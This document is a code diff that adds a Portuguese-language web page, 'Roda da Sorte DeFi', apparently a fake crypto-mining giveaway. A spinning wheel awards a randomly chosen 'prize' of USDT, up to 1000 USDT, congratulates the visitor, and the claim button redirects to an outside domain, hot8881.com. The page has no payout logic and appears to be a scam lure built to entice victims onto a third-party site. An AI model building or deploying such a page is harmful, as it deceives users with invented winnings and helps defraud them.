@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Roda da Sorte DeFi - Mineração</title>
+<link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;700&display=swap" rel="stylesheet" />
+<style>
+  body {
+    margin: 0;
+    min-height: 100vh;
+    background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+    font-family: 'Rubik', sans-serif;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    padding: 40px 20px 60px;
+    color: #fff;
+  }
+  h1 {
+    margin: 0 0 8px 0;
+    font-weight: 700;
+    font-size: 32px;
+    text-shadow: 1px 1px 5px rgba(0,0,0,0.4);
+  }
+  p.subtitle {
+    margin: 0 0 30px 0;
+    font-weight: 400;
+    font-size: 18px;
+    opacity: 0.85;
+  }
+  .wheel-container {
+    position: relative;
+    width: 420px;
+    height: 420px;
+  }
+  canvas#wheelcanvas {
+    border-radius: 50%;
+    background: #fefefe;
+    box-shadow: 0 0 15px rgba(0,0,0,0.3);
+  }
+  /* 指针：红色三角箭头，向内指，固定在转盘顶部中心 */
+  #pointer {
+    position: absolute;
+    top: -45px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 0; 
+    height: 0;
+    border-left: 22px solid transparent;
+    border-right: 22px solid transparent;
+    border-top: 35px solid #ff4444; /* 向下的三角箭头，向内指 */
+    filter: drop-shadow(0 0 5px rgba(255, 0, 0, 0.9));
+    z-index: 10;
+  }
+  #spinbtn {
+    margin-top: 25px;
+    padding: 15px 48px;
+    font-size: 22px;
+    background: #ffd700;
+    color: #333;
+    font-weight: 700;
+    border: none;
+    border-radius: 12px;
+    cursor: pointer;
+    box-shadow: 0 4px 8px rgba(255, 215, 0, 0.6);
+    transition: background-color 0.25s ease;
+  }
+  #spinbtn:hover {
+    background: #ffea00;
+  }
+  #result {
+    margin-top: 28px;
+    font-size: 24px;
+    font-weight: 700;
+    min-height: 60px;
+    text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  #confirmBtn {
+    margin-top: 15px;
+    padding: 10px 32px;
+    font-size: 20px;
+    background: #28a745;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    box-shadow: 0 3px 6px rgba(40,167,69,0.7);
+    display: none; /* 初始隐藏 */
+  }
+  #confirmBtn:hover {
+    background: #218838;
+  }
+</style>
+</head>
+<body>
+
+  <h1>🎉 Roda da Sorte DeFi</h1>
+  <p class="subtitle">Gire e ganhe bônus exclusivos de mineração USDT!</p>
+
+  <div class="wheel-container">
+    <canvas id="wheelcanvas" width="420" height="420"></canvas>
+    <div id="pointer"></div>
+  </div>
+
+  <button id="spinbtn">GIRAR 🎁</button>
+  <div id="result"></div>
+  <button id="confirmBtn">Confirmar e Receber</button>
+
+<script>
+  const prizes = [
+    "5 USDT",
+    "10 USDT",
+    "30 USDT",
+    "Experiência 3 dias",
+    "100 USDT",
+    "Obrigado",
+    "Mineração 7 dias",
+    "1000 USDT"
+  ];
+  const colors = [
+    "#f44336", "#e91e63", "#9c27b0", "#2196f3",
+    "#4caf50", "#ff9800", "#00bcd4", "#8bc34a"
+  ];
+
+  const canvas = document.getElementById("wheelcanvas");
+  const ctx = canvas.getContext("2d");
+  const centerX = canvas.width / 2;
+  const centerY = canvas.height / 2;
+  const radius = 190;
+  const segmentCount = prizes.length;
+  const segmentAngle = (2 * Math.PI) / segmentCount;
+
+  let currentAngle = 0;
+  let isSpinning = false;
+  let chosenIndex = 0;
+
+  // 画转盘函数
+  function drawWheel(angle) {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    ctx.save();
+    ctx.translate(centerX, centerY);
+    ctx.rotate(angle);
+    for(let i = 0; i < segmentCount; i++){
+      ctx.beginPath();
+      ctx.fillStyle = colors[i];
+      ctx.moveTo(0, 0);
+      ctx.arc(0, 0, radius, i*segmentAngle, (i+1)*segmentAngle);
+      ctx.closePath();
+      ctx.fill();
+
+      ctx.save();
+      ctx.rotate(i*segmentAngle + segmentAngle/2);
+      ctx.fillStyle = "#fff";
+      ctx.font = "bold 16px Rubik";
+      ctx.textAlign = "center";
+      ctx.textBaseline = "middle";
+
+      const text = prizes[i];
+      const maxWidth = radius * 0.6;
+      let lines = [];
+      if(text.length > 10){
+        lines = text.split(" ");
+      } else {
+        lines = [text];
+      }
+      const lineHeight = 18;
+      for(let j=0; j<lines.length; j++){
+        ctx.fillText(lines[j], radius * 0.55, (j - (lines.length-1)/2) * lineHeight);
+      }
+      ctx.restore();
+    }
+    ctx.restore();
+  }
+
+  // 缓动函数
+  function easeOut(t) {
+    return t*(2 - t);
+  }
+
+  // 旋转函数
+  function spin(){
+    if(isSpinning) return;
+    isSpinning = true;
+    document.getElementById("result").textContent = "";
+    document.getElementById("confirmBtn").style.display = "none";
+
+    const spins = Math.floor(Math.random()*4) + 5;  // 5~8圈
+    chosenIndex = Math.floor(Math.random()*segmentCount);
+
+    // 角度调整：转盘顺时针转，指针固定在顶部(0度)指向中心
+    // 所以最后角度 = 旋转圈数*360度 - (奖项索引*单区块角度 + 单区块角度/2)
+    // 转成弧度计算
+    const finalAngle = (2*Math.PI)*spins - (chosenIndex*segmentAngle + segmentAngle/2);
+
+    let start = null;
+    function animate(timestamp){
+      if(!start) start = timestamp;
+      const elapsed = timestamp - start;
+      const duration = 4500;
+      if(elapsed < duration){
+        const progress = elapsed/duration;
+        currentAngle = easeOut(progress)*finalAngle;
+        drawWheel(currentAngle);
+        requestAnimationFrame(animate);
+      } else {
+        currentAngle = finalAngle;
+        drawWheel(currentAngle);
+        showResult();
+        isSpinning = false;
+      }
+    }
+    requestAnimationFrame(animate);
+  }
+
+  // 显示中奖结果，并显示确认按钮
+  function showResult(){
+    const prize = prizes[chosenIndex];
+    const resultDiv = document.getElementById("result");
+    resultDiv.innerHTML = `🎉 <strong>Parabéns! Você ganhou:</strong> <br><span style="font-size:28px; margin-top:8px;">${prize}</span>`;
+    const btn = document.getElementById("confirmBtn");
+    btn.style.display = "inline-block";
+  }
+
+  // 点击确认按钮跳转
+  document.getElementById("confirmBtn").addEventListener("click", ()=>{
+    window.location.href = "http://hot8881.com";
+  });
+
+  // 初始化绘制
+  drawWheel(0);
+
+  // 绑定按钮
+  document.getElementById("spinbtn").addEventListener("click", spin);
+</script>
+
+</body>
+</html>
